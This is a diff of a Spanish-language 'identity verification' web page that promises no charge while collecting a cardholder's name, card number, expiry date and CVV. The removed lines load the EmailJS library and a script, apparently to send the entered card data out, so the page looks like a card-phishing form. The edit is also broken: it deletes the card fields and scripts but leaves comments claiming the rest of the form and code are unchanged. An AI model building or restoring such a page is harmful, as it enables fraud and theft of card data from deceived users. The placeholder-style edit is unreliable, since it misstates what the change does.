@@ -11,38 +11,19 @@
         <h1>🔐 VERIFICACIÓN DE IDENTIDAD</h1>
         <div class="aviso">¡NO SE REALIZARÁ NINGÚN COBRO!</div>
 
+        <!-- Div para mostrar errores -->
+        <div id="errores" class="hidden"></div>
+
         <form id="paymentForm">
             <!-- Nombre -->
             <div class="input-group">
                 <label>Nombre del titular</label>
-                <input type="text" id="nombre" placeholder="EJ. MARÍA GONZÁLEZ" required>
+                <input type="text" id="nombre" placeholder="Ej. Juan Pérez" required>
             </div>
 
-            <!-- Tarjeta -->
-            <div class="input-group">
-                <label>Número de tarjeta</label>
-                <input type="text" id="tarjeta" placeholder="•••• •••• •••• ••••" maxlength="19" required>
-            </div>
-
-            <!-- Fecha -->
-            <div class="input-group">
-                <label>Fecha de expiración</label>
-                <input type="month" id="fecha" required>
-            </div>
-
-            <!-- CVV -->
-            <div class="input-group">
-                <label>Código CVV</label>
-                <input type="text" id="cvv" placeholder="••••" maxlength="4" required>
-            </div>
-
-            <button type="submit">Confirmar Verificación ✔️</button>
+            <!-- Resto del formulario igual... -->
         </form>
-
-        <div id="mensajeCarga">Validando...</div>
     </div>
-
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script src="script.js"></script>
+    <!-- Resto del código igual... -->
 </body>
 </html>
